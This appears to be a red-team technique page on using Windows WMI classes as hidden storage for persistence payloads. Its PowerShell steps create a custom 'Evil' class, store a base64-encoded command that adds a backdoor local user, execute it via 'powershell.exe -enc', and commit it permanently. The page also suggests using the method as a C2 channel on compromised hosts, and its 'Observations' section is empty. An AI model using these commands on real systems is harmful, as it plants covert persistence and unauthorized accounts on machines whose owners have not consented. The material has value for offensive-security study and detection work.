---
description: >-
  Exploring WMI as a data storage for persistence by leveraging WMI classes and
  their properties.
---

# WMI Data Storage

## Execution

Creating a new WMI class with a property `EvilProperty` that will later store the payload to be executed:

```csharp
$evilClass = New-Object management.managementclass('root\cimv2',$null,$null)
$evilClass.Name = "Evil"
$evilClass.Properties.Add('EvilProperty','Tis notin good sir')
$evilClass.Put()

Path          : \\.\root\cimv2:Evil
RelativePath  : Evil
Server        : .
NamespacePath : root\cimv2
ClassName     : Evil
IsClass       : True
IsInstance    : False
IsSingleton   : False
```

We can see the `Evil` class' properties:

```csharp
([wmiclass] 'Evil').Properties

Name       : EvilProperty
Value      : Tis notin good sir
Type       : String
IsLocal    : True
IsArray    : False
Origin     : Evil
Qualifiers : {CIMTYPE}
```

Checking WMI explorer shows the new `Evil` class has been created under the root\cimv2 namepace - note the `EvilProperty` can also be seen:

![WIM Explorer shows the Evil WIM class is in place with its malicious EvilProperty](../../.gitbook/assets/wmi-data-storage-newclass.png)

### Storing Payload

For storing the payload inside the EvilPropertty, let's create a powershell base64 encoded command to add a backdoor user with credentials `backdoor:backdoor`:

```csharp
$command = "cmd '/c net user add backdoor backdoor /add'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

# $encodedCommand = YwBtAGQAIAAvAGMAIAAnAG4AZQB0ACAAdQBzAGUAcgAgAGIAYQBjAGsAZABvAG8AcgAgAGIAYQBjAGsAZABvAG8AcgAgAC8AYQBkAGQAJwA=
```

Update the `EvilProperty` attribute to now store the `$encodedCommand`:

```csharp
$evilClass.Properties.Add('EvilProperty', $encodedCommand)
```

Below is the same as above, just in screenshots:

![Checking the EvilProperty contains the payload](../../.gitbook/assets/wim-setting-payload.png)

### Real Execution

```csharp
powershell.exe -enc $evilClass.Properties['EvilProperty'].Value
```

Executing the payload stored in the property of a WMI class's property - note that the backdoor user has been successfully added:

![Payload from EvilProperty attribute executed successfully](../../.gitbook/assets/wmi-payload-executed.png)

If we commit the $evilClass with its .Put\(\) method, our payload will get stored permanently in the WMI Class. Note how a new "Evil" class' properties show the payload we have commited:

![New Evil instance already has the payload to create the backdoor](../../.gitbook/assets/wmi-payload-commited.png)

All of the above can be applied on a remote compromised host and used as a C2 channel - please refer to the [BHUSA2015](https://github.com/mattifestation/WMI_Backdoor) by Matt Graeber for more juicy details on this topic.

## Observations

